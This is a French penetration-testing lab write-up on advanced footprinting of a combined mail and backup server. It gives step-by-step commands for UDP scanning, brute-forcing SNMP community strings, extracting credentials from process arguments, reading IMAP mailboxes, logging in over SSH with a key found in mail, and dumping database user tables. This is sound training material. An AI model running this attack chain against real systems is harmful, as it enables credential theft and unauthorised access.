# Lab - Footprinting avancé

## Scénario

Tu audites un serveur interne qui cumule deux rôles critiques : serveur de messagerie (MX) et serveur de sauvegarde des comptes utilisateurs. Ce type de configuration est courant dans les PME ou les filiales qui centralisent leurs services sur un nombre limité de machines. Le client a créé un compte de test sur cette machine et te demande de démontrer qu'il est possible d'en récupérer les identifiants à partir d'une position réseau non authentifiée.

## Approche

La surface d'attaque visible (IMAP, POP3) nécessite des credentials pour être exploitée. Il faut donc chercher un autre angle d'entrée. Sur les serveurs Linux internes, les services UDP sont souvent négligés dans la configuration de sécurité. SNMP en particulier peut exposer des informations système, y compris des processus, des scripts planifiés, et leurs arguments.

La démarche se décompose en quatre phases :

1. **Reconnaissance TCP et UDP** : identifier tous les services exposés, y compris ceux sur UDP
2. **Exploitation SNMP** : brute-forcer les community strings et extraire les OID intéressants
3. **Pivot vers la messagerie** : utiliser les credentials trouvés pour accéder aux boites mail
4. **Pivot vers le système** : exploiter les données récupérées dans les mails pour obtenir un accès SSH, puis explorer les services locaux

## Commandes

### Phase 1 : Enumération

```bash
# depuis Exegol - scan TCP complet
sudo nmap -sV -p- <IP_CIBLE> -Pn -n
```

```bash
# depuis Exegol - scan UDP ciblé
sudo nmap -sU -F -sV <IP_CIBLE>
```

Le scan TCP révèle les services de messagerie (IMAP/POP3 sur les ports 110, 143, 993, 995). Le scan UDP fait apparaitre SNMP (port 161), qui n'est pas visible en TCP.

### Phase 2 : SNMP

```bash
# depuis Exegol - brute-force des community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP_CIBLE>
```

La community string par défaut (`public`) ne retourne rien. Le brute-force fait apparaitre une community custom.

```bash
# depuis Exegol - dump complet des OID SNMP
snmpwalk -v2c -c <community> <IP_CIBLE>
```

{% hint style="info" %}
Les OID SNMP sous `hrSWRunParameters` (1.3.6.1.2.1.25.4.2) exposent les arguments de ligne de commande des processus en cours. Des scripts de sauvegarde ou de gestion de comptes y apparaissent souvent avec des credentials en clair dans leurs paramètres.
{% endhint %}

### Phase 3 : Messagerie

Avec les credentials récupérés via SNMP, se connecter au serveur IMAP :

```bash
# depuis Exegol - connexion IMAP sécurisée
openssl s_client -connect <IP_CIBLE>:993
```

```
1 LOGIN user password
1 LIST "" *
1 SELECT INBOX
1 FETCH 1 body[]
```

Explorer tous les dossiers (pas seulement INBOX). Les mails internes contiennent régulièrement des clés SSH, des fichiers de configuration, ou des mots de passe échangés entre collègues.

### Phase 4 : Accès système

Si une clé SSH privée est trouvée dans un mail :

```bash
# depuis Exegol - préparer la clé et se connecter
chmod 600 id_rsa
ssh -i id_rsa user@<IP_CIBLE>
```

Une fois connecté, explorer les services locaux. Un service de base de données (MySQL, PostgreSQL) tournant en local peut contenir les comptes utilisateurs de l'entreprise.

{% tabs %}
{% tab title="MySQL" %}
```bash
mysql -u user -p
```

```sql
SHOW DATABASES;
USE nom_base;
SELECT * FROM users;
```
{% endtab %}

{% tab title="PostgreSQL" %}
```bash
psql -U user -h 127.0.0.1
```

```sql
\l
\c nom_base
SELECT * FROM users;
```
{% endtab %}
{% endtabs %}

## Ce qu'on en retient

- Le scan UDP est indispensable. SNMP n'apparait jamais en TCP et c'est pourtant l'un des services les plus bavards quand il est mal configuré.
- Les community strings non standard donnent un faux sentiment de sécurité. `onesixtyone` avec une bonne wordlist les retrouve en quelques secondes.
- La chaine d'exploitation ici suit une logique de rebond classique : SNMP (credentials), IMAP (clé SSH), SSH (accès système), MySQL (données cibles). Chaque service compromis ouvre la porte au suivant.
- Les scripts de sauvegarde et de gestion de comptes contiennent presque toujours des credentials en dur. SNMP les expose parce qu'il liste les processus avec leurs arguments.

***
